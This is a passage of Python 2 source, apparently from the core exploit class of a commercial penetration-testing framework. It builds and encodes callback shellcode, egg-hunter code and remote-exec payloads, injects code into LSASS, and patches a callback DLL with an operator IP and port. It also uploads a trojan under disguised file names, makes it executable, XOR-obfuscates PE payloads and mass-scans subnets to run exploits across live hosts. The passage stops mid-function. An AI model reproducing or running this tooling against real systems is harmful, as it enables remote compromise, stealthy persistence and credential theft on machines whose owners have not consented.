        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=self.intel_encode(badstring, rawshellcode)

        if not shellcode:
            self.log("Could not encode shellcode")
            return 0

        self.log( "Done encoding shellcode.")

        #debug int
        #shellcode="\xcc"+shellcode
        self.setShellcode(shellcode)
        return shellcode




    def createWin32SearchShellcode(self,localhost,localport,rawshellcode=None,subesp=None, debug=False):
        """
        Creates a mosdef search shellcode
        you can specify a raw shellcode to use or a value to subtract from esp before the decoding is done (of the search shellcode)
        (you'll want to use a value that is %4 so winsock doesn't die)
        """

        #print "Calling back to %s:%s"%(localhost,localport)
        #print "Rawshellcode=%s"%rawshellcode
        ret=self.createWin32Shellcode(self.badstring,localhost,localport,rawshellcode)

        if not ret:
            return ret
        #we're going to  search for it, so we add tag1 and tag2 to the front.
        #Tag2 must come before tag1!!!
        if debug:
            self.shellcode= "\xcc"+self.shellcode
        #get random tag1 and tag2 for when you run this twice
        self.tag1 = chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61))
        self.tag2 = chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61))
        self.log("Tag1: %s Tag2: %s"%(self.tag1, self.tag2))
        self.shellcode=self.tag2+self.tag1+self.shellcode

        self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        print "Searchcode length: %d"%len(self.searchcode)
        self.encodedsearchcode=self.intel_encode(self.searchbadstring, self.searchcode)

        #now do our subesp if asked to do so...
        if subesp:
            self.encodedsearchcode=mosdef.assemble("add $-%d, %%esp"%subesp,"X86")+self.encodedsearchcode

        #self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        self.log("Length of search shellcode: %d, length of real shellcode: %d\n"%(len(self.searchcode), len(self.shellcode)))
        #print prettyprint(self.encodedsearchcode)
        for c in self.badstring:
            if c in self.encodedsearchcode:
                self.log("%s in encodedsearchcode. :<"%prettyprint(c))
                self.log("%s"%prettyprint(self.encodedsearchcode))
        return 1

    def createSparcShellcode(self, badstring, localhost,localport,rawshellcode=""):
        if rawshellcode in ["",None]:
            print "Generating typical sparc shellcode"
            sc=shellcodeGenerator.solarisSparc()
            #solaris
            #sc.addAttr("subsp",[1000])
            sc.addAttr("connect",{"ipaddress": localhost, "port": localport})
            sc.addAttr("RecvExec",None)
            rawshellcode=sc.get()
        #new encoder setup
        encoder=addencoder.sparcaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        self.shellcode=shellcode
        print "Created shellcode - len=%d"%(len(shellcode))
        return 1

    def addjmpesp(self,eiploc,eip,addesp):
        """
        This function is useful for exploits which need to return using
        a jmpesp (basic stack overflow technique) but for which for some reason
        the retloc is actually within the shellcode. So we first encode the shellcode
        to avoid bad chars, then "chunk" it with another simple encoder (which
        hopefully passes the filter).
        """
        from exploitutils import intel_order
        shellsize=len(self.shellcode)+20 #fluff
        #-4 for len(eip) -5 for len(jmpback)
        jmpback=mosdef.assemble("jmp $%s\n"%(-eiploc-4-5),"X86") #code to jump backwards
        chunksize=len(jmpback)+4 #4 for eip
        done=0
        chunkbin=""
        while done!=1:
            chunktry=eiploc-len(chunkbin)
            chunker=shellcodeGenerator.X86()
            if addesp!=0:
                chunker.addAttr("addesp",[addesp])
            chunker.addAttr("one_chunkize",{"chunkloc": chunktry,
                                            "chunksize": chunksize,
                                            "shellsize": shellsize,
                                            "badstring": self.badstring})
            chunkbin=chunker.get()
            self.log("Notice: chunker length was %d, chunktry: %d"%(len(chunkbin),chunktry))
            if chunktry+len(chunkbin)==eiploc:
                done=1

        chunkloc=eiploc-len(chunkbin)
        self.log("Length of chunker is %d"%len(chunkbin))
        self.shellcode2=""
        self.shellcode2+=chunkbin+self.shellcode[:chunkloc]+intel_order(eip)+jmpback
        self.shellcode2+=self.shellcode[chunkloc:]
        self.shellcode=self.shellcode2
        for a in self.badstring:
            if a in self.shellcode:
                self.log("Could not encode shellcode. Found %s in string!"%prettyprint(a))
                self.log("Chunker=%s"%prettyprint(chunkbin))
                return 0
        return 1

    def createMessageBoxShellcode(self):
        """
        This createShellcode displays a message when
        the exploit is successful
        """
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", None)
        sc.addAttr("MessageBeep", None)
        sc.addAttr("MessageBox", ["HELLO"])
        #sc.addAttr("MessageBox", ["HOW ARE YOU?"])
        sc.addAttr("ExitProcess", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode

    def createHeapSafeInject(self, badstring, localhost, localport,
                             injectme="",setdebugprivs=0):
        if injectme in ["", None]:
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            #sc.addAttr("RecvExecWin32", {"socketreg": "FDSPOT"})
            sc.addAttr("ExitThread", None)

            self.callback.argsDict["fromcreatethread"] = 1
            injectme = sc.get()
        #    print "Dumping InjectMe Code:" + sc.getcode()

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("HeapSafeInject", { "injectme" : injectme, "setdebugprivs" : setdebugprivs })
        sc.addAttr("ExitThread", None)
        injectcode = sc.get()

        #print "Dumping HeapSafeInject Code:" + sc.getcode()

        rawshellcode = injectcode

        if badstring=="":
            self.shellcode=rawshellcode
            return rawshellcode

        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            raise "ErrorEncodingShellcode"
        self.setShellcode(shellcode)

        return shellcode

    def createInjectToSelf(self, localhost, localport, injectme="",
                           vProtect=False, movetostack=False,
                           vAlloc=False, universal=False, win8_compatible=False):
        """
        Returns the shellcode, but not encoded, and does not set
        self.shellcode
        """
        if injectme in ["", None]:
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", {"win8_compatible": win8_compatible})
            sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            if universal:
                mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
                mosdef_id=self.engine.getNewMosdefID(self)
                sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})

            sc.addAttr("RecvExecDepSafe",None) #MOSDEF
            sc.addAttr("ExitProcess",None)
            self.callback.argsDict["fromcreatethread"] = 0
            injectme = sc.get()

        sc = shellcodeGenerator.win32()
        sc.vProtectSelf=vProtect
        sc.vAllocSelf = vAlloc
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("InjectToSelf", { "injectme" : injectme })
        sc.addAttr("ExitProcess", None)
        shellcode = sc.get()
        if movetostack:
            sc = shellcodeGenerator.win32()
            sc.standalone = 1
            sc.addAttr("moveToStack", { "Length":len(shellcode) })
            shellcode = sc.get() + shellcode
        return shellcode

    # note that process name is case sensitive!
    def createHeapSafeInjectIntoProcess(self, badstring, localhost, localport, injectme="", smallcode=0, processname="LSASS.EXE", backupprocess="lsass.exe", append=None, revert=0):
        if injectme in ["", None] and not smallcode:
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            if localhost == "0.0.0.0":
                sc.addAttr("BindMosdef", {"port" : localport})
                sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            else:
                sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
                sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread", None)

            self.callback.argsDict["fromcreatethread"] = 1
            injectme = sc.get()
        else:
            self.callback.argsDict["fromcreatethread"] = 0

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0})
        self.log("Using process: %s"% processname)

        if revert:
            # if you revert, the function table changes too !!!
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)

        if smallcode: # smallcode means we use the custom injectme code which uses a function addresses block transfer
            if append:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, \
                            "processname" : processname, "append" : append, "revert" : revert, "backupprocess" : backupprocess})
            else:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, "processname" : processname, \
                            "revert" : revert, "backupprocess" : backupprocess })
        else:
            if append:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, "injectme" : injectme, \
                            "revert" : revert, "processname" : processname, "append" : append, "backupprocess" : backupprocess })
                sc.addAttr("ExitThread", None)
            else:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, "injectme" : injectme, \
                            "revert" : revert, "processname" : processname, "backupprocess" : backupprocess })
                sc.addAttr("ExitThread", None)

        injectcode = sc.get()

        #print "Dumping HeapSafeInject Code:" + sc.getcode()

        rawshellcode = injectcode

        if badstring == "":
            self.shellcode = rawshellcode
            return rawshellcode

        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode = encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode == "":
            self.log( "Could not encode shellcode")
            raise "ErrorEncodingShellcode"
        self.setShellcode(shellcode)

        return shellcode

    def easychunk(self,chunkloc,chunksize,subesp):
        """
        Similar to the addespchunk, but less hand-holding

        This is a bit tricky to get right - it should handle everything for you
        but if you detect an error in your shellcode, most likely at the end
        where ws2_32.dll is getting cut off, then you need to tell one_chunkize
        to encode MORE of your shellcode, and I probably need to revisit every
        exploit that uses this...

        """

        shellsize=len(self.shellcode) #+chunksize+40 #fluff to make this work. Should this be larger?
        done=0
        chunkbin=""
        eiploc=chunkloc
        while done!=1:
            chunktry=eiploc-len(chunkbin)
            chunker=shellcodeGenerator.X86()
            if subesp!=0:
                chunker.addAttr("subesp",[subesp,self.badstring])
            chunker.addAttr("one_chunkize",{"chunkloc": chunktry,
                                            "chunksize": chunksize,
                                            "shellsize": shellsize,
                                            "badstring": self.badstring})
            chunkbin=chunker.get()
            self.log("Notice: chunker length was %d, chunktry: %d"%(len(chunkbin),chunktry))
            if chunktry+len(chunkbin)==chunkloc:
                done=1

        chunkloc=chunkloc-len(chunkbin)
        self.log("Length of chunker is %d"%len(chunkbin))
        shellcode2=""
        shellcode2+=chunkbin+self.shellcode[:chunkloc]
        shellcode2+="A"*chunksize
        shellcode2+=self.shellcode[chunkloc:]
        self.shellcode=shellcode2
        if hasbadchar(self.shellcode,self.badstring):
            for a in self.badstring:
                if a in self.shellcode:
                    break
            self.log("Could not encode shellcode. Found %s in string!"%prettyprint(a))
            self.log("Chunker=%s"%prettyprint(chunkbin))
            return 0
        return 1

    def mosdef_x86_dll(self, ip, port):
        """
        Creates a DLL that calls back to a host and port...returns the actual data as a binary string
        """
        from engine.config import canvas_resources_directory

        #read in the file
        data = file(os.path.join(canvas_resources_directory,'mosdef_x86.dll'), 'rb').read()
        #replace the IP
        data = data.replace('255.255.255.255\x00',
                            '%s\x00' % ip
                            + 'P' * (16-len(ip)-1))
        #replace the port
        data = data.replace(struct.pack('<H', 5555),
                            struct.pack('<H', port))
        return data


    def setPort(self,port):
        self.port=port
        return

    def threaded_run_on_host(self,target,check_for_life=False):
        """
        Starts a new thread that runs run_on_host against our target
        whenever we're ready
        """
        tr=ThreadRunner(target,self)

        tr.check_for_life=check_for_life
        done=0
        while not done:
            if self.state==self.HALT:
                #halted so we don't continue trying
                return
            try:
                tr.start()
                done=1
            except:
                self.debuglog("Could not start a new thread!")
                #this happens a fair amount on silica
                self.threadwait()
                #error: can't start new thread
                pass
        return

    def threaded_run_on_host_if_alive(self,target):
        """
        Starts a new thread to scan this host for life
        If alive, this thread will then self.run_on_host(target)
        """
        self.threaded_run_on_host(target,check_for_life=True)
        return


    def wait_for_threads(self,threads):
        """
        Wait for threads to finish
        """

        def sleepget(obj):
            time.sleep(3)
            devlog("threads", "obj.currentthreads=%d"%obj.currentthreads)
            return obj.currentthreads>0

        if not threads:
            return
        start_time=time.time()
        if threads:
            self.log("Found all hosts, waiting until threads are finished")
            time.sleep(10)
            if self.currentthreads:
                self.log("Starting to wait for %d threads to finish"%self.currentthreads)
            while sleepget(self) or sleepget(self) or sleepget(self):
                self.log("Waiting for %d threads to finish. Rogue thread timeout %d"%(self.currentthreads,self.rogue_thread_timeout))
                self.log("Active thread table:")
                self.thread_mutex.acquire()
                for ip in self.thread_table.keys():
                    ##How do we get actual module name from autohack which is under massattack  ??
                    self.log("Target IP: %s  Thread Object: %s"%(ip, self.thread_table[ip] ))
                self.thread_mutex.release()
                if (time.time() - start_time) >= self.rogue_thread_timeout:
                    self.log("Rogue thread timeout of %d hit. Killing all remaining threads with extreme prejudice..."%(self.rogue_thread_timeout))
                    self.kill_rogue_threads()
                    self.log("Rogue threads killed.")
                    break
                time.sleep(60)
            self.log("All threads finished")
        return

    def wait_for_threads_new(self):
        """
        Wait for threads to finish
        """

        def sleepget(obj):
            time.sleep(3)
            devlog("threads", "obj.currentthreads=%d"%obj.currentthreads)
            return obj.currentthreads>0

        start_time=time.time()

        self.log("Found all hosts, waiting until threads are finished")
        time.sleep(10)
        if self.currentthreads:
            self.log("Starting to wait for %d threads to finish"%self.currentthreads)
        while sleepget(self) or sleepget(self) or sleepget(self):
            self.log("Waiting for %d threads to finish. Rogue thread timeout %d"%(self.currentthreads,self.rogue_thread_timeout))
            self.log("Active thread table:")
            self.thread_mutex.acquire()
            for ip in self.thread_table.keys():
                ##How do we get actual module name from autohack which is under massattack  ??
                self.log("Target IP: %s Thread Object: %s"%(ip, self.thread_table[ip] ))
            self.thread_mutex.release()
            if (time.time() - start_time) >= self.rogue_thread_timeout:
                self.log("Rogue thread timeout of %d hit. Killing all remaining threads with extreme prejudice..."%(self.rogue_thread_timeout))
                self.kill_rogue_threads()
                self.log("Rogue threads killed.")
                break
            time.sleep(60)
        self.log("All threads finished")
        return

    def kill_rogue_threads(self):

        for t in self.thread_table.values():
            self.log("Killing thread: %s"%(t))
            try:
                t.suicide()
            except SystemExit, err:
                pass

        self.currentthreads=0
        self.thread_table={}


    def set_current_attack_module(self, module):
        """
        Register the name of the module were are currently running against the target
         - ThreadRunner2 will override this method with a threadsafe one
        """
        self.current_attack_module=module

    def get_current_attack_module(self, ip=None):
        """
        Retrieve the name of the module were are currently running against the target
         - ThreadRunner2 will override this method with a threadsafe one
        """
        return self.current_attack_module

    def C_isOpen(self, host, port, timeout=None, node=None):
        """
        Used by TCP Connectscan's
        Returns:
        "Open" if port is open
        "Closed" if port is closed
        "Host Unreachable" if host is unreachable
        "RST" if remote host sent us a reset
        """
        s=self.gettcpsock(socknode=node)
        if not timeout:
            if hasattr(self, "timeout"):
                timeout=self.timeout
            else:
                #default timeout is two seconds here
                timeout=2
        try:
            s.set_timeout(timeout)
        except:
            pass


        ret ="Open"
        try:
            fd=s.connect((host, port))
            #devlog("cisopen","fd=%s"%fd)
        except timeoutsocket.Timeout:
            ret="Timeout"
        except socket.error,err:
            if hasattr(err,"__len__") and len(err)>0 and err[0]==113:
                ret="Host Unreachable"
            else:
                ret="Closed"
        except:
            return "RST"

        s.close()
        return ret


    def portopen(self, port):
        """stub function for cleanliness' sake"""
        host=self.target.interface
        return self.C_isOpen(host, port)

    def has_named_pipes(self, target, customports=[]):
        "Check for our ability to contact named pipes on that target"
        return self.a_port_open(target, [139, 445, 1060] + customports)

    def a_port_open(self, target, listofports):
        """
        Looks for one port open among a list of ports. Uses the
        first node with sock capabilities.

        Returns true if one is found. False if we were unable to
        run the check or if we did not find an open port.
        """
        #sometimes people pass in a target object instead of a string ip
        if hasattr(target, "interface"):
            target=target.interface

        for node in self.argsDict["passednodes"]:
            if "sock" in node.capabilities:
                self.log("Checking for open ports using node %s"%node.getname())
                for port in listofports:

                    ret=self.C_isOpen(target, port, node=node)
                    if ret=="Open":
                        self.log("Port is open")
                        return True
                self.log("No open ports were found.")
                return False
        self.log("No node had socket capabilities...failing to find open port and did not check")
        return False

    def run_on_all_alive_hosts(self,threads=False, timeout=None):
        # suspected to leak memory somewhere
        #from sizer import scanner
        #from alx_memprofiler import printinfo
        #objs = scanner.Objects()

        """
        runs one function from the exploit on all possible hosts,
        using self.host and self.netmask

        Threads is a boolean here, not a count. We store the count
        in self.maxthreads, which is also copied by hostlistener.link()
        """
        if self.argsDict.get("silica"):
            self.log("Silica Mode")
            # SILICA uses arpscanner not portsweep for speed
            self.exploitnodes("arpscanner") #knowledge should be expanded with this automatically
            return self.run_on_all_known_hosts(threads=threads)


        ips=getIPList(self.host+"/"+str(self.netmask))
        node=self.argsDict["passednodes"][0]
        for host in ips:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0
            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                if timeout:
                    self.rogue_thread_timeout=timeout
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.log("Starting threaded run on host:%s with thread timeout of:%d "%(host, self.rogue_thread_timeout))
                self.threaded_run_on_host_if_alive(host)
                continue
            self.log("Scanning %s for life"%host)
            #otherwise, we're alive. Let's get a handle to that host...
            target=node.get_known_host(host)
            if not target:
                if not self.checkAlive(host):
                    self.log("Host %s not alive, skipping"%host)
                    continue
                target=node.new_host(host)
            #self.run_on_host must be defined!
            ret=self.run_on_host(target)        ###TODO - FIX THIS FOR MASS ATTACK TWO
            if ret:
                self.log("Returning from run_on_all_alive_hosts from success on host %s"%host)
                return ret

        #printinfo(objs, 10) # prints out top 10 memory consuming objects (0 prints all)
        self.wait_for_threads(threads)
        return 0


    # shortcut for running a module
    def run_module(self, mod_id):
        try:
            app=self.engine.getModuleExploit(mod_id)
            app.link(self)
            app.target=self.target
            app.version = 1
            ret=app.run()
            if ret:
                app.setProgress(100)
            else:
                app.setProgress(-1)

            result=app.result
            del(app)
            return result

        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            traceback.print_exc(file=sys.stderr)
            self.log("Failed running: "+ mod_id)
            return False


    def run_threaded_on_alive_hosts(self, e_module, targets=None):
        """
        NEW: Tiny wrappper to ensure life checks are done on targets
        """
        if self.argsDict.get("silica"):
            self.log("Silica Mode")
            targets = self.run_module("arpscanner")
            self.run_threaded_scan(e_module, targets)
            # SILICA uses arpscanner not portsweep for speed
            #self.exploitnodes("arpscanner") #knowledge should be expanded with this automatically
            #return self.run_on_all_known_hosts(threads=threads)

        self.run_threaded_scan(e_module, targets, life_check=True)

    def run_threaded_scan(self, e_module, targets=None, life_check=False):
        """
        NEW: Run a scan over a range of targets with specified exploit module
        """

        if not targets:
            targets=getIPList(self.host+"/"+str(self.netmask))

        if self.argsDict.get("silica"):
            tr2=ThreadRunner2.ThreadRunner2(self, targets, e_module, life_check, delay_loop=1) # needed for rts
        else:
            tr2=ThreadRunner2.ThreadRunner2(self, targets, e_module, life_check)

        tr2.start() # start thread from bugtracker exception handler

        ##This should call back into the exploit module that called this scan to process results appropriately
        self.process_thread_results(tr2.result_q, tr2.end_of_results_marker)

    def process_thread_results(self, status_q, end_of_run_marker):
        """
        This is the ThreadRunner2 magic right here. Essentially ALL threads return state about
        what they are up to via a q to the ThreadTracker, The TrheadTracker then does some
        sanitization and spits stuff back down a results q to us.

        This means that we can sit in a loop and read from the same q for all the targets in
        our range and do stuff like reporting based on what we see coming back.

        Data comes back in the form of:
             [Thread Object to which this status relate] , [status marker] ,[data]

        *REMEBER* this is one queue for ALL threads, not one for each!
        """
        print "This should be overloaded by the calling module, not for use in production code"
        while 1:
            tr2_obj, status, data=status_q.get()

            if status == end_of_run_marker:
                ##ALL threads have completed so now more status/results to process
                tr2_obj.join()
                break
            #self.log("Child thread result: [%s] = %s"%(ip, data))
            print "Status data returned: %s",data

        self.log("All results gathered")


    def checkAlive(self,host):
        self.log("In CheckAlive")
        if self.force:
            return 1

        #you can't do port 25 because norton will return true for you. It's lame, but true.
        portslist=[80, 135, 445, 443, 21, 22, 64432]
        #add our port if !=0
        if self.port:
            portslist+=[self.port]

        for each in portslist:
            self.log("Checking %d for life"%(each))
            try:
                #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s=self.gettcpsock()
                s.set_timeout(1.0)
                s.connect((host,each))
                self.log("Connected to port %d - Alive"%each)
                return 1
            except socket.error,message:
                #import traceback
                #traceback.print_exc(file=sys.stderr)
                if message[0]==113:
                    #no route to host
                    self.log("No route to host %s"%host)
                    return 0
                if message[0] in [111,10061]:
                    #10061 is nt, 111 is unix
                    self.log("Host %s alive (connection refused on port %d)"%(host,each))
                    return 1 #port closed, host alive
                #otherwise we have no idea what the exception was
            except timeoutsocket.Timeout:
                #import traceback
                #traceback.print_exc(file=sys.stderr)
                self.log("Host %s timed out on port %d"%(host, each))
                #return 0
        #self.log("Firewalled?")
        return 0 #firewalled?

    def run_on_all_possible_hosts(self,threads=False):
        """
        This function will call a self.run_on_hosts(target) for every target within our host/netmask.

        It does not care if they are known or alive or not.
        """
        ips=getIPList(self.host+"/"+str(self.netmask))
        node=self.argsDict["passednodes"][0]
        totalips=len(ips)
        i=0

        sil = self.argsDict.get("silica", False)
        sgp = self.argsDict.get("sgp", False)

        for host in ips:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0


            self.log("Scanning %s"%host)

            #Set the progress as we go through - we're not threaded
            #so essentially this is a sequential loop
            #even if we are threaded, it's good to show how close to done we are
            self.setProgress((float(i)/float(totalips)) * 100.0)

            # This is also needed for every thread for the n810
            if sil:
                i+=1
                if (not i%5):
                    lat = 0.8
                else:
                    lat = 0

                if sgp.driver == "ipwraw":
                    time.sleep(0.4+lat)
                elif sgp.driver == "atheros":
                    time.sleep(0.2+lat)


            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.threaded_run_on_host(host)
                continue


            target=node.get_known_host(host)
            if not target:
                target=node.new_host(host,add=0) #don't add the host by default
            #self.run_on_host must be defined!
            ret=self.run_on_host(target)
            if ret:
                return ret

        self.wait_for_threads(threads)
        return 0

    def createLinuxCallbackShellcode(self, localhost, localport, badchars):
        """
        Get standard linux callback shellcode
        """
        self.shellcode=linuxshell.getcallbackcode(localhost,localport)
        self.shellcode=self.intel_encode(badchars, self.shellcode)
        if not self.shellcode:
            self.log("Encoding shellcode failed!") #serious error!
        return self.shellcode




    def run_on_all_known_hosts(self,threads=False):
        """
        This runs self.run_on_host() on all known hosts - within our targeted
        netrange.
        """

        ips=getIPList(self.host+"/"+str(self.netmask))
        node=self.argsDict["passednodes"][0]

        for host in ips:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0

            #otherwise, we're alive. Let's get a handle to that host...
            target=node.get_known_host(host)

            if not target:
                continue

            self.log("Scanning known host: %s"%host)
            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.threaded_run_on_host(host)
                continue

            #self.run_on_host must be defined!
            ret=self.run_on_host(target)
            #don't forget, we only get here if we are not threaded.
            if ret:
                return ret

        #if we are threaded, we end up here
        self.wait_for_threads(threads)
        return 0

    def run_on_list_of_hosts(self, hostlist, threads=False):
        i=0
        for host in hostlist:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0

            #Let's get a handle to that host...
            #first we add it - we don't check to see if it really exists here...we assume you already did that.
            target=self.argsDict["passednodes"][0].add_host(host)

            if not target:
                continue

            self.log("Scanning host: %s"%host)

            #handle progress bar
            self.setProgress((float(i)/len(hostlist)) * 100.0)
            i+=1

            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.threaded_run_on_host(host)
                continue

            #self.run_on_host must be defined!
            ret=self.run_on_host(target)
            #don't forget, we only get here if we are not threaded.
            if ret:
                return ret

        #if we are threaded, we end up here
        self.wait_for_threads(threads)
        return 0


    def createKnownWin32Shellcode(self,known,host,port,subesp=0):
        """
        Creates a very small shellcode that is SP+Lang dependant

        check the top of win32knownshellcodegenerator for valid values of known
        """
        from shellcode.win32knownshellcodegenerator import win32Known
        myobj=win32Known()
        myobj.badstring=self.badstring
        myobj.knownSP(known)
        myobj.addAttr("findeipnoesp",{"subespval": subesp}) #don't mess with eip
        myobj.addAttr("smalltcpconnect",{"port": port,"ipaddress": host})
        myobj.addAttr("smallrecv",None)
        myobj.addAttr("NoExit",None)
        #self.addAttr("initstackswap",None)
        #self.addAttr("stackSwap",None)
        ret=myobj.get()

        encoder= addencoder.inteladdencoder()
        encoder.setbadstring(self.badstring)
        encodedshellcode=encoder.encode(ret)
        self.shellcode=encodedshellcode
        return

    def mini_search_code(self, tagbyte, start_register):
        """
        x86 only
        does not correct for bad bytes!
        Finds our shellcode offset from a register and jmps there
        """
        ret=""
        #loop for TAGBYTE twice in a row, to avoid false positives on our own shellcode
        code="""
        searchloop:
            inc %REGISTER
            cmpb $TAGBYTE, (%REGISTER)
            jne searchloop
            inc %REGISTER
            cmpb $TAGBYTE, (%REGISTER)
            jne searchloop
        inc %REGISTER
        jmp %REGISTER
        """
        code=code.replace("REGISTER", start_register)
        code=code.replace("TAGBYTE", "%d"%(ord(tagbyte)))
        ret=mosdef.assemble(code, "X86")
        bad=intersection(self.badstring, ret)
        if bad:
            raise Exception, "Bad chars in mini_search_code: %s"%prettyhexprint(bad)
        return ret

    def uploadmosdeftrojan(self, target_os=None, uploaddirs=None, filename=None, node=None):
        """
        Builds and uploads a MOSDEF trojan to the target!
        Return False or the name of the file we uploaded ( so you can spawn it )
        """

        if not node:
            node=self.argsDict["passednodes"][0]
        #First we need to create our payload
        if type(target_os)==type(""):
            target_os=canvasos(target_os) #windows base for trojan building
        else:
            if not target_os:
                target_os=self.target_os
        #now target_os is finally set up properly :>

        #generate a filename if we are not passed one
        if not filename:
            if target_os.isUnix():
                filename = ".%d" % random.randint(1,65535)
            else:
                filename="msvc%d.exe"%randint(0,5000)

        if self.callback.port==0:
            self.log("Failed to set callback port (is there a -d option?)")
            return 0

        #build the trojan
        self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os)
        #self.mosdeftrojan is now built

        if not self.mosdeftrojan:
            self.log("Could not build remote trojan! :<")
            return 0

        #now upload the trojan
        if not uploaddirs:
            from ExploitTypes.CommandLineExecuter import CommandExploit
            c = CommandExploit()

            bases = {
                "Windows" : c.get_win32WritableDirs(node),
                "Linux"   : c.linuxWritableDirs,
                "Solaris" : c.solWritableDirs,
                "OSX"     : c.osxWritableDirs,
            }

            uploaddirs=bases[target_os.base][:]

        #we assume if we have permission to read it, we have permission to
        #execute it...
        for directory in uploaddirs:
            fname=directory+filename
            # Not all nodes have an upload_data that'll take plain data in a string, instead of a source file.

            if hasattr(node.shell, "upload_data"):
                ret = node.shell.upload_data(self.mosdeftrojan, fname)
            else:
                TFN = "trojan.bin.tmp"
                fo = open(TFN, "wb")
                fo.write(self.mosdeftrojan)
                fo.close()
                try:
                    self.log("Trying upload to %s" % fname)
                    ret=node.upload(TFN, dest=directory, destfilename=filename)
                    self.log("Finished upload.")
                except NodeCommandError, i:
                    self.log("Upload failed: %s" % i)
                os.unlink(TFN)

            if ret:
                self.log("uploaded trojan to %s"%fname)
                break
            else:
                self.log("Failed to upload file to %s" % fname)

        if ret:
            if target_os.isUnix():
                self.log("Target OS is a unix, setting the file mode +x")
                ret = node.runcommand("chmod a+x %s" % fname)
                # Error reporting from runcommand is pretty patchy :(
            return fname
        else:
            self.log("All attempts at uploading failed")
            return False

    def prepare_obfuscated_pe(self, mosdefpayload, arch='X86'):
        """
        Insert a payload (mosdefpayload) within a PE template.
        This requires to locate a couple of symbols that needs to be patched.

        Tested on:
            - Windows XP sp3 32 bits (PE32)
            - Windows 2008 R2 64 bits (PE32, PE64)
            - Windows 2012 64 bits (PE32, PE64)
            - Windows 2016 64 bits (PE32, PE64)
        """

        def generate_encryption_key():
            return os.urandom(16)

        def generate_dummy():
            return os.urandom(4) * 10000000

        def find_offset(payload, string):
            ret = payload.find(string)
            if ret == -1:
                return 0
            else:
                return ret

        def patch_binary_at_offset(s,idx,data):
            prefix = s[:idx]
            suffix = s[idx+len(data):]
            return prefix + data + suffix

        def string_encryption(s1,key):
            j = 0
            s2 = ''
            for i in xrange(len(s1)):
                s1_i = s1[i]
                k_i = key[i%len(key)]
                s2 += chr(ord(s1_i) ^ ord(k_i) ^ ((i+j)%256))
                j = (19*j + 23)
            return s2

        try:
            if arch == 'X86':
